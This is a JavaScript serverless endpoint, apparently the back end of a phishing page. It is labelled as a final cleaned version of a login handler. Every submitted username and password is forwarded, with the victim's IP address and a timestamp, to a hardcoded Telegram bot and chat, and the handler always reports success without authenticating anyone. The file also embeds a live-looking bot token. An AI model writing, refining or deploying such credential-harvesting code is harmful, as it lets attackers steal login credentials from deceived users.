// File: /api/login.js (Final, Cleaned, and Corrected Version)

const TELEGRAM_BOT_TOKEN = '8233346929:AAHRpX-fz0n3LOsCLbsCEGGEQFDF7xulTyY';
const TELEGRAM_CHAT_ID = '6402487270';

// This function escapes special characters for Telegram's MarkdownV2.
const escapeMarkdown = (text) => {
  if (typeof text !== 'string') return '';
  const toEscape = /[_*[\]()~`>#+-=|{}.!]/g;
  return text.replace(toEscape, '\\$&');
};

export default async function handler(req, res) {
  if (req.method === 'POST') {
    const { username, password } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    // Escape each variable to prevent injection or formatting errors.
    const safeUsername = escapeMarkdown(username);
    const safePassword = escapeMarkdown(password);
    const safeIp = escapeMarkdown(ip);
    const safeTimestamp = escapeMarkdown(new Date().toISOString());

    // Correctly formatted message with double-escaped dashes.
    const message = `
🚨 *NEW LOGIN* 🚨
\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
👤 *Username:* \`${safeUsername}\`
🔑 *Password:* \`${safePassword}\`
💻 *IP Address:* \`${safeIp}\`
⏰ *Timestamp:* \`${safeTimestamp}\`
\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
    `;

    const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    try {
      const response = await fetch(telegramApiUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'MarkdownV2'
        } ),
      });

      const responseData = await response.json();

      if (!response.ok) {
        console.error('--- TELEGRAM API ERROR ---', responseData);
      } else {
        console.log('Message sent to Telegram successfully!');
      }

    } catch (error) {
      console.error('--- FETCH FAILED ---', error);
    }

    res.status(200).json({ success: true });
  } else {
    res.status(405).send('Method Not Allowed');
  }
}
